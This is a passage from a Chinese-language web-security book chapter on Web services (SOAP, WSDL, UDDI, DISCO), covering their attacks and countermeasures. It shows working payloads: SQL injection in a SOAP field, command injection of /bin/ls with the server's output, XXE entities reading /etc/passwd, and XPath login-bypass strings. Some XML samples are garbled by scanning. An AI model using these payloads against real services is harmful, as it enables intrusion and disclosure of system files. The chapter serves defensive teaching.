Web 服务可以通过各种方法传输，但是现在大多数标准文档都在讨论 HTTP（以及非 ASCII 数据的 MIME）。也可以使用其他任何基于 Internet 的服务（比如 SMTP），因此在图 8-1 中，我们把 Web 服务打包在一个普通的“服务”中，由它作为中介与其他 Web 服务通信。

无论使用什么传输，SOAP 都被封装在传输中——最常见的例子是 HTTP 上的 SOAP（或者 HTTPS，如果要求保持通信的机密性和完整性）。回忆一下，SOAP 是用来和别的 Web 服务通信的协议——它传送什么样的消息呢？基于 World Wide Web Consortium（W3C） SOAP 入口的定义：“SOAP 提供一个 XML 文档的定义，该文档被用在无中心的对等实体间、分布式的环境中进行层对层的结构化和典型的信息交换。它是一个无状态的单向的消息交换方式……”。SOAP 消息由三部分组成：信封、信头和信体，如图 8-2 所示。

 </div>

就底层细节来说，一个通过 HTTP 封装的 SOAP 消息，看起来就像下面这个例子中的股票交易服务这样（注意信封、信头、信体，以及这些部件里面的内容）。注意，最初的请求是 HTTP POST。

POST /StockTrader HTTP/1.1
Host: www.stocktrader.edu
Content-Type: text/xml; charset="utf-8"
Content-Length: nnnn
SOAPAction: "Some-URI"
<SOAP-ENV:Envelope>

xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<SOAP-ENV:Header>
<m:quote xmlns:m="http://www.stocktrader.edu/quote"
    env:actor="http://www.w3.org/2001/12/soap-envelope/actor/next"
    env:mustUnderstand="true">
<m:reference>uuid:90e4567w-q345-739r-ba5d-pqff98fe8j7d</reference>
<m:dateAndTime>2001-11-29T13:20:00.000-05:00</m:dateAndTime>
</m:quote>
<SOAP-ENV:Body>
<m:GetQuote xmlns:m="Some-URI">
    <symbol>MSFT</symbol>
</m:GetQuote>
</SOAP-ENV:Body>
/ SOAP-ENV:Envelope>

对我们这个假想的 Web 服务请求，其响应应该如下:

HTTP/1.1 200 OK
Content-Type: text/xml; charset="utf-8"
Content-Length: nnnn

<SOAP-ENV:Envelope
    xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
    SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
    <SOAP-ENV:Body>
        <m:GetQuoteResponse xmlns:m="Some-URI">
            <Price>67.5</Price>
        </m:GetQuoteResponse>
    </SOAP-ENV:Body>
</SOAP-ENV:Envelope>

##### SOAP 攻击工具

虽然第一眼看上去可能觉得复杂，但 HTTP 上的 SOAP 就像其他任何基于文件的 Internet 协议一样容易掌握——同样也容易被操纵。

因为 Web 服务只是 HTTP 上的 XML，任何 HTTP 操纵工具（像那些在第 1 章中讨论的那些）都可以对其奏效。但是，既然有专门处理 SOAP 的优秀工具，为何还要做所有的工作呢？下面列出了笔者挑选的几种 SOAP 攻击工具。

WebService Studio 这是由 www.gotdotnet.com 提供的免费工具，也是我们最常使用的工具。输入一个 WSDL 位置，该工具会生成所有可用的方法，也会提供交互界面以输入数据。它会显示原始的 SOAP 请求，以及为用户的 Web 服务请求创建的响

应。它也拥有一些很酷的功能，比如以良好的树状视图显示 WSDL。图 8-3 显示了在执行中的 WebServices Studio。

 </div>

o WSDigger 由 Foundstone 提供的免费工具，可以做一些非常简单的自动化测试，比如针对 Web 服务进行 XPath 注入、SQL 注入和命令执行。它不像 WebService Studio 那么灵活，但是能输出很详细的报告，描述所发现的针对 Web 服务的所有漏洞，是一个很有用的工具。

o SoapClient.com SoapClient 有一个很好的 Web 页面，列出了非常有用的 Web 服务工具，比如 WSDL 验证器、WSDL 分析器、SOAP 客户端和 UDDI 浏览器。如果你需要某种工具，通常你可以在这里找到它们。

#### 8.1.2 WSDL

虽然在图 8-1 中没有显示 WSDL，但它是 Web 服务概念的核心。把 WSDL 看成是 Web 服务自身的一个核心组件吧，Web 服务通过这种机制发布或输出关于它的接口和功能的信息。WSDL 通常通过 Web 服务所在的服务器上一个或多个可被访问的页面来实现的（通常

这些页面具有.wsd1 和 .xsd 文件扩展名)。

W3C 规范把 WSDL 描述为 “一个 XML 语法，用来把网络服务描述成为能够交换消息的通信端点的集合”。事实上，这意味着 WSDL 文档描述了一个 Web 服务输出什么功能（操作），以及如何连接（绑定）到这些功能。我们继续先前讨论的 SOAP 例子，它是一个 WSDL 定义的，提供股票交易功能的简单 Web 服务。注意，我们的例子包含了下列关于服务的关键信息：

☐ types 和 message 元素定义了传递消息的格式（通过嵌入的 XML 模式定义）。

◦ portType 元素定义了消息传送的语义(比如, request-only, request-response 和 response-only)。

☐ Binding 元素指明了特定传输的不同编码方式，比如 HTTP，HTTPS 或 SMTP。

Service 元素定义了服务的端点（一个 URL）。

<?xml version="1.0"?>
<definitions name="StockTrader" targetNamespace="http://stocktrader.edu/stockquote.wSDL" xmlns:tns="http://stocktrader.edu/stockquote.wSDL" xmlns:xsd1="http://stocktrader.edu/stockquote.xsd" xmlns:soap="http://schemas.xmlsoap.org/wSDL/soap/" xmlns="http://schemas.xmlsoap.org/wSDL/">
<types>
<schema targetNamespace="http://stocktrader.edu/stockquote.xsd" xmlns="http://www.w3.org/2000/10/XMLSchema">
<element name="GetQuote">
<complexType>
<all>
<element name="tickerSymbol" type="string"/>
</all>
</complexType>
</element>
<element name="Price">
<complexType>
<all>
<element name="price" type="float"/>
</all>
</complexType>
</element>
</types>

<message name="GetQuoteInput">

</message>

<message name="GetQuoteOutput">
    <part name="body" element="xsd1:StockPrice"/>
</message>

<portType name="StockQuotePortType">
    <operation name="GetQuote">
        <input message="tns:GetQuoteInput"/>
        <output message="tns:GetQuoteOutput"/>
    </operation>
</portType>

<binding name="StockQuoteSoapBinding"
    type="tns:StockQuotePortType">
    <soap:binding style="document" transport="http://schemas.xmlsoap.org/
    soap/http"/>
    <operation name="GetQuote">
        <soap:operation soapAction=
            "http://stocktrader.edu/GetQuote"/>
        <input>
            <soap:body use="literal"/>
        </input>
        <output>
            <soap:body use="literal"/>
        </output>
    </operation>
</binding>

<service name="StockQuoteService">
    <documentation>User-readable documentation here
    </documentation>
    <port name="StockQuotePort"
        binding="tns:StockQuoteBinding">
        <soap:address location="
            "http://stocktrader.edu/stockquote"/>
        </port>
    </service>
</definitions>

WSDL 文档里的信息一般是非常有用的，因为它通常是提供给公众使用的。但是，就像你在这里看到的一样，如果没有被很好地保护的话，很多商业逻辑都会通过 WSDL 暴露

出来。事实上，WSDL 文档经常被比作 “接口契约”（interface contract），它描述了一个特定的企业在交易中所能接受的术语。另外，如果 Web 开发者在诸如 WSDL 文档的应用程序文件中放入了不恰当的信息，那他们会因此而狼狈不堪，而且我们确信通过这个接口，可以看到大量新的信息泄漏漏洞。

#### 8.1.3 目录服务：UDDI 和 DISCO

就像 UDDI.org 定义的一样，“统一描述、发现和集成协议（Universal Description, Discovery, and Integration, UDDI）是分布式 Web 服务的信息注册规范。UDDI 也是一个公众可以访问的规范实现集合，企业可以根据这一规范对其提供的 Web 服务进行注册，以便被其他企业找到他们。”

图 8-4 描述了 UDDI 是如何加入到 Web 服务框架中的。首先，一个 Web 服务提供商采用正确的 API 来发布关于它服务的公开信息（API 通常依赖于所使用的工具箱）。然后，Web 服务的客户可以在这个 UDDI 目录查找这个特定的服务，UDDI 目录将把客户指引到 Web 服务提供商的正确 WSDL 文档中。WSDL 指明了如何连接和使用 Web 服务，它最终将客户和其所寻找的特定功能联合起来。虽然不是必须的，图 8-4 中所有的交互都在 SOAP 之上（可能大多数实现也是这样的）。

 </div>

UDDI 目录分为两种：公开的和私有的。公开的 UDDI 是最常见的，大多数公司为了向公众提供他们的 Web 服务，都使用公开的 UDDI。公开 UDDI 目录的例子是 uddi.microsoft.com 或 uddi.ibm.com。也有一些不那么被人广泛所知的公开 UDDI 目录，比如 xmethods.net。

私有 UDDI 目录通常在大型公司里，为内部或 B2B 的使用而实现。这些目录在公司的内部，通常只能被员工或公司合作伙伴所访问。因为 UDDI 目录是很多公司提供他们 Web

服务的地方，所以查询尽可能多的目录，看所访问的公司是否有开放的服务是很有用处的。有很多 UDDI 客户工具可以用来搜索目录。我们推荐使用一个 SoapClient.com 上的工具。图 8-5 显示了一次对 amazon 的 UDDI 搜索。

 </div>

http://66.28.98.121:9004//?businessKey=CDE7A0FD-07E2-FBF0-4BDA-5C8796F4CA93 businessEntity

 </div>

原始的 UDDI 查询如下所示:

<URI>

在真正发布任何 Web 服务到 UDDI 之前，请仔细认真地考虑一下。即使有适当的认证，它也为攻击打开了方便之门。如果你的公司有合作伙伴需要你的 Web 服务的目录，请建立一个带有认证的私有 UDDI。这种方法可以不向公众公开。

注意 你绝对不能只通过隐匿来实现安全，但采取安全加上隐匿的措施，是绝对没有害处的。

公开 UDDI 目录当然是公开的，因此找到它们并不困难。它们通常包含无关紧要的信

息，但私有 UDDI 目录就是另一回事了。

如果攻击者发现了一个私有 UDDI，那么通常就意味着他们发现金矿了。这有两方面的原因：第一，大多数私有 UDDI 目录提供了非常有趣的 Web 服务，这些服务构成了公司应用程序架构的核心；第二，因为大部分内部、私有 UDDI 被认为是外部“无法”访问的，因此它们很少执行安全控制，很多时候甚至没有基本的认证。

如果 “公共” 的访问是允许的，公众就可以创建或编辑目录内的 Web 服务，那么重命名一个已存在的 Web 服务，并作为中间人创建 Web 服务的精确备份，记录所有的流量，或者甚至随心所欲地操纵流量，将成为一个常见的攻击。

在很多情况下，发现 UDDI 非常简单。许多公司会有 uddi.site.com，访问它们的方法就像发送请求到 http://uddi.site.com/inquiry 或者公开访问 http://uddi.site.com/publish 一样简单。一些其他常见的位置如表 8-1 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>/uddi-server/publish</td><td style='text-align: center; word-wrap: break-word;'>/juddi/publish</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>/uddi-server/inquiry</td><td style='text-align: center; word-wrap: break-word;'>/juddi/inquiry</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>/uddi/inquire</td><td style='text-align: center; word-wrap: break-word;'>/wasp/uddi/inquiry/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>/uddi/publish</td><td style='text-align: center; word-wrap: break-word;'></td></tr></table>

DISCO

发现 Web 服务（Discovery of Web Services，DISCO）是 Microsoft 的 .NET Server 操纵系统和其他 .NET 相关产品里面提供的一个专利技术。为了使用 DISCO 来发布一个部署的 Web 服务，你只需简单地创建一个 .disco 文件，并将其与其他和服务器相关的文件（比如 .asmx，.wSDL，.xsd 和其他文件类型）一起，放在 Web 服务的虚拟根目录下（vroot）。.disco 文档是一个 XML 文档，它包含了到其他描述 Web 服务资源的链接，就像 WSDL 文件包含的接口契约一样。下面是一个简单的 DISCO 文件例子。

<disco:discovery
    xmlns:disco="http://schemas.xmlsoap.org/disco/"
    xmlns:SCL="http://schemas.xmlsoap.org/disco/scl/">
    <!-- reference to other DISCO document -->
    <disco:discoveryRef
        ref="related-services/default.disco"/>
    <!-- reference to WSDL and documentation -->
    <scl:contractRef ref="stocks.asmx?wSDL"
        docRef="stocks.asmx"/>
</disco:discovery>

DISCO 文件的主要元素是 `contractRef`，它有两个属性，ref 和 docRef，分别指向一个给定服务器的 WSDL 和文档文件。另外，`discoveryRef` 元素可以将给定的 DISCO 文件链接到其他 DISCO 文档上，并创建一个分布在多台机器上甚至多个机构中的与 DISCO 文档相关的网络。因此，`.disco` 文件经常提供恶意攻击者感兴趣的宝藏。

在.NET 框架 SDK 里面，Microsoft 发布了一个叫做 disco.exe 的工具，它链接到一个给定的 DISCO 文件，提取在特定 URL 上发现的关于 Web 服务的信息（将输出写到一个名为.discomap 的文件里），并下载所有已发现的.discro 和.wsd1 文档。它还可以浏览整个站点的 DISCO 文件，并用下面的语法将它们保存到指定的输出目录中。

C:\\>disco /out:C:\\output http://www.victim.com/service.asmx
Microsoft (R) Web Services Discovery Utility
[Microsoft (R) .NET Framework, Version 1.0.3705.0]
Copyright (C) Microsoft Corporation 1998-2001. All rights reserved.
Disco found documents at the following URLs:
http://www.victim.com/service.asmx?wSDL
http://www.victim.com/service.asmx?disco

下面这些文件包含了在对应 URL 上发现的内容:

C:\output\service.wSDL <- http://www.victim.com/service.asmx?wSDL
C:\output\service.disco <- http://www.victim.com/service.asmx?disco

文件 C:\output\results.discomap 包含了到这些文件的链接。

在大多数情况下，客户端不知道.disco 文件的确切地址。因此，DISCO 也可以在虚拟的根目录的默认页面中提供线索。如果虚拟根目录的默认页面是 HTML 文档，可以使用 LINK 标记将客户重定向到.disco 文件：

<HTML>
<HEAD>
<link type='text/xml' rel='alternate' href='math.disco' />
</HEAD>
...
</HTML>

如果虚拟根目录的默认页面是 XML 文档，你可以使用 XML 样式表处理指令，来完成同样的事情：

<?xml-stylesheet type="text/xml" alternate="yes" href="math.disco"?>

尽管 DISCO 可能会被更受欢迎的 UDDI 规范所代替，但毫无疑问，由于 DISCO 的低复杂度和简约方法，很多开发者会用 DISCO 发布 Web 服务。和 Microsoft 已有的广泛配置的技术结合在一起，DISCO 或者类似的东西很可能成为寻找 Web 服务信息的恶意黑客关注的目标。

#### 8.1.4 与 Web 应用程序安全的相似性

Web 服务在很多方面都像一个离散的 Web 应用程序。它们由 Web 服务器上虚拟目录中的脚本、可执行文件和配置文件组成。因此，我们本书中讨论的很多漏洞也对 Web 服务同样适用。所以，不要认为你配置了这种叫做 “Web 服务” 的新东西，就忽略 Web 应用程序安全的基本要素。关于 Web 应用安全要素的检查列表，请参看附录 A。

### 8.2 攻击 Web 服务

好了，现在你已经具备了足够的背景知识了。在现实世界中，Web 服务会遭受怎么样的攻击呢？这一节将讨论最近我们在咨询工作中遇到的实例。

#### DISCO 和 WSDL 泄漏

流行度：5
简单度：10
影响度：3
风险度：6

如果简单地在服务请求后附加特殊的参数，Microsoft 的 Web 服务（.asmx 文件）会暴露 DISCO 和/或 WSDL 信息。例如，下面的 URL 会链接到一个 Web 服务，并得到这个服务的人类可阅读的界面。

http://www.victim.com/service.asmx

在 URL 后添加?disco 或?wSDL，可以显示 DISCO 或 WSDL 信息，如下所示：

http://www.victim.com/service.asmx?disco

或者这样，

http://www.victim.com/service.asmx?wSDL

图 8-6 显示了对一个 Web 服务进行此类攻击的结果。这个例子中的数据非常有用（你

可以从一个“想”要公布自身信息的 Web 服务中获取所有你期望得到的信息），但我们从这些输出中看到了一些非常糟糕的事情——SQL Server 证书、访问敏感文件和目录的路径，以及 Web 开发者喜欢填到 Config 文件中的所有有用东西。WSDL 的信息还要详细得多——就像我们讨论过那样，它列出了所有的服务端点和数据类型。在开始恶意输入攻击前，黑客难道还需要其他什么东西吗？

 </div>

我们还需要指出，通过仔细查看 Web 服务或相关页面的 HTML 源代码，可能找到 DISCO 文件的实际名字。在本章前面讨论 DISCO 的时候，我们看到了在 HTML 中如何“暗示”出 DISCO 文件的位置。

### ☑ DISCO 和 WSDL 泄漏对策

假设你想公开一些关于你的 Web 服务的信息，防止 DISCO 或 WSDL 泄漏成为严重问题的最佳办法是，不要将敏感的和私有的信息放在 XML 中坐以待毙。对这些文件的存放目录进行认证控制也是一个好方法。保证 DISCO 或 WSDL 信息不落在入侵者手中的唯一方法，就是避免创建与服务相关的 .wSDL，.discomap，.disco 和 .xsd 文件。如果使用这些文件，就要把它们设计成可以发布的形式。

注入攻击

影响度：8
风险度：8

大多数 Web 服务易受到的主要攻击，同样也是所有软件程序所困扰的问题：输入验证。事实上，我们发现 Web 服务甚至比“经典”的基于 HTTP/HTML 的 Web 应用程序更容易受到攻击。这是因为大部分开发者都假设与 Web 服务通信的是计算机而不是人。举个例子，下面这个 SOAP 请求显示了如何在一个 Web 服务调用里面执行 SQL 注入。加粗的部分是在 accountNumber 参数中利用的 SQL 注入攻击。

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://
/www.w3.org/2001/XMLSchema">
<soap:Body>
<InjectMe xmlns="http://tempuri.org/">
<accountNumber>0' OR '1' = '1</accountNumber>
</InjectMe>
</soap:Body>
</soap:Envelope>

下面，我们将展示一个通过 SOAP 服务执行远程命令的例子。该 SOAP 服务用来把图像从某种格式转换成另一种格式。该注入问题的根本原因是服务使用了用户输入的文件名，并把它们直接放在命令行上。下面是 POST 请求，我们注入了简单的/bin/ls 命令（加粗的字体）来获取服务器上的目录列表。当然我们也可以做些影响更严重的事情。

POST /services/convert.php HTTP/1.0
Content-Length: 544
SoapAction: http://www.host.com/services/convert.php
Host: www.host.com
Content-Type: text/xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?><SOAPENV:Envelope xmlns:SOAPSDK1="http://www.w3.org/2001/XMLSchema" xmlns:SOAPSDK2="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAPSDK3="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAPENV="http://schemas.xmlsoap.org/soap/envelope/[""<SOAPENV:Body><SOAPSDK4:convert.xmlns:SOAPSDK4="http://www.host.com/services/"><SOAPSDK1:source></bin/ls</SOAPSDK1:source><SOAPSDK1:from>test</SOAPSDK1:from><SOAPSDK1:to>test</SOAPSDK1:to></SOAPSDK4:convert></SOAP-ENV:Body></SOAP-ENV:Envelope>

下面是服务器的响应，注意 Is 命令的输出以粗体显示。

HTTP/1.1 200 OK

Date: Sat, 18 Jan 2003 22:41:37 GMT

Server: Apache/1.3.26 (Unix) mod_ssl/2.8.9 OpenSSL/0.9.6a ApacheJServ/1.1.2 PHP/4.2.2

X-Powered-By: PHP/4.2.2

Connection: close

Content-Type: text/html

<b>Warning</b>: fopen("cv/200301182241371.1/bin/ls", "w+") - No such file or directory in <b>/usr/home/www/services/convert.php</b> on line <b>24</b><br/>

<br/>

<?xml version="1.0" encoding="ISO-8859-1"?><SOAP-ENV:Envelope SOAPENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:si="http://soapinterop.org/xsd"><SOAPENV:Body><convertResponse><return xsi:type="xsd:string">class.smtp.php<convert.php>

convertclient.php

dns.php

dns_rpc.php

dnsclient.php

index.php

mailer.php

</return></convertResponse></SOAP-ENV:Body></SOAP-ENV:Envelope>

#### ☑ 注入攻击的对抗措施

Web 服务针对注入的对抗措施与经典的 Web 应用程序输入/输出验证相同。我们在第 6 章和第 7 章中已经详细地讨论了这些主题。

#### 外部实体攻击

流行度：2
简单度：10
影响度：3
风险度：2

XML 允许一个文档或文件通过使用外部实体而嵌入到原始的 XML 文档里。实体就像 XML 的快捷方式，它们允许一个标签与特定文本块或其他数据关联，插入到 XML 中。举

个例子，一个实体的声明如下:

<!DOCTYPE bookcollection [
<!ENTITY WS "Web Security">
<!ENTITY W "Wireless Security">
<!ENTITY NS "Network Security">
<!ENTITY HS "Host Security">
<!ENTITY PS "Physical Security">
]>

这些实体可以在 XML 文档中通过引用其快捷名来使用，当交付 XML 文档时，它们会被扩展成全名。

<bookcollection>
    <title id="1">Web Hacking Exposed</title>
    <category>&WS;</category>
    <year>2006</year>

    <title id="2">Hacking Exposed</title>
    <category>&NS;</category>
    <year>2000</year>
    </bookcollection>

当解析后，完整的 XML 文档看起来如下所示：

<bookcollection>
    <title id="1">Web Hacking Exposed</title>
    <category>Web Security</category>
    <year>2006</year>
    <title id="2">Hacking Exposed</title>
    <category>Network Security</category>
    <year>2000</year>
    </bookcollection>
</bookcollection>

如你所见，这是非常好的快捷方式，它使事情很容易管理。实体也可以被声明成外部实体，外部实体是将实体的定义指向一个包含分发数据的远程位置。这也是一个漏洞。举个例子，考虑下面这个外部实体引用：

<!DOCTYPE foo [<!ENTITY test SYSTEM "http://www.test.com/test.txt"><!ELEMENT foo ANY>]>

把该外部实体引用注入到一个 SOAP 请求中，接收到 SOAP 的服务器会获得位于“http://www.test.com/test.txt”的文件，并把 test.txt 的内容注入到 SOAP 请求中。下面是一

个 SOAP 请求的例子，我们已经把外部实体请求注入到里面（以粗体显示）：

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE foo [<!ENTITY test SYSTEM "http://www.test.com/
test.txt"><!ELEMENT foo ANY>}]>
<SOAP-ENV:Envelope xmlns:SOAPSDK1="http://www.w3.org/2001/XMLSchema"
xmlns:SOAPSDK2="http://www.w3.org/2001/XMLSchema-instance"
xmlns:SOAPSDK3="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAPENV="
http://schemas.xmlsoap.org/soap/envelope/">
<SOAP-ENV:Body>
<SOAPSDK4:login xmlns:SOAPSDK4="urn:MBWS-SoapServices">
<SOAPSDK1:userName></SOAPSDK1:userName>
<SOAPSDK1:authenticationToken></SOAPSDK1:authenticationToken>
</SOAPSDK4:login>
<foo>&test;</foo>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>

然后 SOAP 服务器返回如下的响应:

HTTP/1.1 200 OK
Content-Type: text/xml

<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY test SYSTEM "http://www.test.com/test.txt";>
<foo>... This is the content from the file test.txt ...</foo>

请注意，SOAP 服务器解析请求，并找回位于 “http://www.test.com/test.txt” 的内容。然后服务器显示带有 “test.txt” 文件内容的正常 SOAP 输出。有一种攻击更具危害性，它通过改变 URL 位置的指向，告诉 SOAP 服务返回系统密码文件。如下所示，将外部实体改为 “/etc/passwd”，系统就会返回密码文件。

<!DOCTYPE foo [<!ENTITY test SYSTEM "/etc/passwd"><!ELEMENT foo ANY>]>

使用该攻击可以做很多事情：

☐ 在外部实体中使用相对路径读取系统文件。

☐ 把 SOAP 服务器作为网关获得来自其他 Web 服务器的文件。

- 通过发送恶意文件名来发动对 SOAP 服务器的 DoS 攻击, 比如 Win32 中著名的 CON, AUX, COM1 设备。

☐ 利用 SOAP 服务器来对其他服务器做匿名端口扫描。

#### ☐ XML 外部实体对抗措施

如果你在处理非可信的 XML 输入, 就应该禁止外部实体。最好的做法是, 为你的 XML 解析器指定一个处理器, 当遇到外部实体时就中止处理。

###  $ ^{※} $ XPath 注入攻击

XPath 是一门用来查询 XML 文档的语言（更多的信息请参见本章末尾的“参考和进一步阅读”）。它的工作原理和 SQL 类似，使用方法也几乎完全一样。举个例子，比如一个 XML 文件内容如下：

<?xml version="1.0" encoding="utf-8"?>
<Books>
    <Book>
        <Author>Joel Scambray, Stuart McClure, George Kurtz</Author>
        <Title>Hacking Exposed</Title>
        <Publisher>McGraw-Hill Osborne Media</Publisher>
    </Book>
    <Book>
        <Author>Joel Scambray, Stuart McClure</Author>
        <Title>Windows Server 2003 (Hacking Exposed)</Title>
        <Publisher>McGraw-Hill Osborne Media</Publisher>
    </Book>
    <Book>
        <Author>Caleb Sima, Joel Scambray, Mike Shema</Author>
        <Title>Web Applications (Hacking Exposed)</Title>
        <Publisher>McGraw-Hill Osborne Media</Publisher>
    </Book>
</Books>
</Book>

XPath 请求允许开发者浏览和搜索文件中的每个节点，而不是解析整个 XML 文件（这种做法通常是低效的）。使用 XPath 查询，开发者可以简单地返回所有匹配的节点。我们用上面的例子来说明 XPath 查询是如何工作的。

XML 由节点构成。在上面的例子中，Author，Title 和 Publisher 是 Book 节点的元素。XPath 中的节点以 “/” 说明。一个返回该 XML 中所有 Title 的查询应该是这样：

“/Books/Book/Title”。XPath 也支持通配符和快捷名。因此，获得同样结果但更短的请求是“//Title”。双斜线表示从节点的根开始，直到搜索到一个匹配“Title”的结果。如果要请求在“Book”节点下的所有元素，XPath 查询可以是“/Books/Book/*”。

XPath 有很多不同特性和功能，但现在我们已经有足够的背景知识来说明攻击是如何构造的。XPath 注入和 SQL 注入的原理完全一样：如果 XPath 查询以用户提供的输入创建，那么可以注入任意的命令。我们看一个创建到 Web 服务中的 XPath 查询例子。我们已经把转换为 XPath 查询的用户的输入加粗。这样是为了确定提供的用户名/密码是否与文件中的数据组匹配。

XPathNavigator nav =XmlDoc.CreateNavigator();
XPathExpression Xexpr = nav.Compile("string(//user[name/text()='+Username.Text+'' and password/text()='+Password.Text+ ''] / account/text()"));
String account=Convert.ToString(nav.Evaluate(Xexpr));
if (account="") {
// Login failed.
} else {
// Login succeeded.
}

就像 SQL 注入一样，攻击者现在必须找到一种方法构造他们的输入，使得 XPath 结果总是返回真，从而成功登录。我们使用经典的 SQL 注入技术来实现——注入一个值总是为“真”的表达式：

User: ' or 1=1 or ''='
Password: junk

现在，当 XPath 查询求值时，它变成了：

//user[name/text()='' or 1=1 or '=' and password/text()='junk'

该查询会返回完整的合法用户列表，并认证攻击者（即使没有提供一个合法的用户名/密码）。一些其他常见的可以用来注入到 XPath 查询中的恶意内容包括：

' or 1=1 or '='
//*
*/*
@/
count(//*)

使用盲 XPath 注入获取整个 XML 数据库也是可能的（Amit Klein 有一篇基于该主题的非常优秀的论文，其链接请查看“参考和进一步阅读”）。

#### ☑ XPath 注入的对抗措施

因为 Xpath 和 SQL 注入非常类似，XPath 注入的对抗措施也几乎完全一样。参看第 7 章关于这些对抗措施的详细讨论。

### 8.3 Web 服务安全基础

对公司防火墙外发布的新 Web 服务感到紧张了吗？你应该是这样的。这一节将讨论一些你可以采取的措施，当你采用尽职尽责的基本的安全和 Web 服务特定技术实现 Web 服务时，这些措施可以用来保护你的在线资产。

#### 8.3.1 Web 服务安全措施

由于技术相对较新，Web 服务安全也在不断地发展。在写本书的时候，Web 服务安全一方面执行经典的应用程序最佳安全措施，另一方面，也在密切关注诸如 WS-Security 一类的安全标准的发展。我们会在本节中讨论这两方面的内容。

##### 认证

如果你在 HTTP 之上实现了一个 Web 服务，对服务访问的限制可以用与 Web 应用程序一样的方法，就是使用在第 4 章中讨论过的标准 HTTP 认证技术，比如基础认证、摘要、Windows 集成认证和 SSL 客户端证书。自己编写的认证机制也是可以的，比如，通过在 SOAP 信头和信体元素中传送认证证书。由于 Web 服务对外公布机构的商业逻辑，因此所有对服务的连接都是需要严格考虑认证的。大多数 Web 服务模型是 B2B 应用模式，而不是 B2C，所以，限制半信任的（semi-trusted）用户访问更加容易。虽然如此，在第 4 章我们讨论过所有 HTTP 基础认证技术所对应的攻击技术，因此不要太信任它们。

##### SSL

由于 Web 服务依赖于通常是明文的 XML，像 SOAP，WSDL 和 UDD 这样的 Web 服务技术在网络中传输时很容易被窃听和篡改。这不是一个新问题，已经被安全套接字层（Secure Sockets Layer，SSL）解决了，在第 1 章中已经讨论过。我们强力推荐将 SSL 和 Web 服务结合起来，防止简单的窃听和篡改攻击。

##### XML 安全

由于 Web 服务主要构建在 XML 之上，所以很多标准被开发出来，以提供基本的安全

构架来支持 XML 的使用。下面是对这些正在发展中的技术的简介——关于它们的更多信息的链接，可以在本章末尾的“参考和进一步阅读”中找到。

XML 签名 一个用来描述 XML 数字签名的规范。该规范为 XML 文档或它的一部分提供认证，消息完整性以及抗抵赖性。

°安全性断言标记语言（Security Assertion Markup Language，SAML）一个用来共享认证和授权信息的格式。

可扩展访问控制标记语言（Extensible Access Control Markup Language，XACML）一个用做信息访问策略的 XML 格式。

我们通常对术语和缩写词不会有什么太深的印象，尤其当它们没有得到证实的时候。此外，我们从来没有在产品环境中实际实现这些技术，因此在真实的世界中几乎没有机会测试它们。我们在此提及这些新兴的 XML 安全标准并不是为了说明它们的竞争力或可靠性，而是为了提起对它们的注意。

##### WS-Security

在 2002 年 4 月 11 日，Microsoft、IBM 和 VeriSign 宣布发布一种新的称为 Web 服务安全性语言（Web Services Security Language，WS-Security）的 Web 服务安全规范（其链接请参看本章末尾的“参考和进一步阅读”）。WS-Security 包含并扩展了前面提到的由 IBM 和 Microsoft 提出的类似规范（即 SOAP-Security，WS-Security 和 WS-License）。

实质上，WS-Security 定义了一组 SOAP 扩展，可以用在 Web 服务通信中实现认证、完整性和保密性。更明确地说，WS-Security 描述了一个标准格式，用来在 SOAP 消息中嵌入数字签名、加密数据和安全令牌（包括诸如 X.509 证书和 Kerberos tickets 这样的二进制元素）。WS-Security 很大程度上整合了前面提到的 XML 安全规范、XML 签名和 XML 加密，并成为其他安全方面规范，比如 WS-Policy，WS-Trust，WS-Privacy，WS-SecureConversation，WS-Federation 和 WS-Authorization 的一个构建模块。

描述 WS-Security 的最好方法是通过一个例子来说明。下面是一个 SOAP 消息，它包含了新的 WS-Security 头和加密内容（我们已经在左列加了行号，以便描述各个消息的功能）：

(001) <?xml version="1.0" encoding="utf-8"?>
(002) <S:Envelope xmlns:S="http://www.w3.org/2001/12/soap-envelope"
         xmlns:ds="http://www.w3.org/2000/09/xmldsig">
     xmlns:wsse="http://schemas.xmlsoap.org/ws/2002/04/secext"
     xmlns:xenc="http://www.w3.org/2001/04/xmlenc">
(003) <S:Header>
(004) <m:path xmlns:m="http://schemas.xmlsoap.org/rp/>
(005) <m:action>http://stocktrader.edu/getQuote</m:action>
(006) <m:to>http://stocktrader.edu/stocks</m:to>

(007) <m:from>mailto:bob@stocktrader.edu</m:from>
(008) <m:id>uuid:84b9f5d0-33fb-4a81-b02b-5b760641c1d6</m:id>
(009) </m:path>
(010) <wsse:Security>
(011) [additional headers here for authentication, etc. as required]
(012) <xenc:EncryptedKey>
(013) <xenc:EncryptionMethod Algorithm=
"http://www.w3.org/2001/04/xmlenc#rsa-1_5"/>
(014) <ds:KeyInfo>
(015) <ds:KeyName>CN=Alice, C=US</ds:KeyName>
(016) </ds:KeyInfo>
(017) <xenc:CipherData>
(018) <xenc:CipherValue>d2FpbmdvbGRfE01m4byV0...
(019) </xenc:CipherValue>
(020) </xenc:CipherData>
(021) <xenc:ReferenceList>
(022) <xenc:DataReference URI="#enc1"/>
(023) </xenc:ReferenceList>
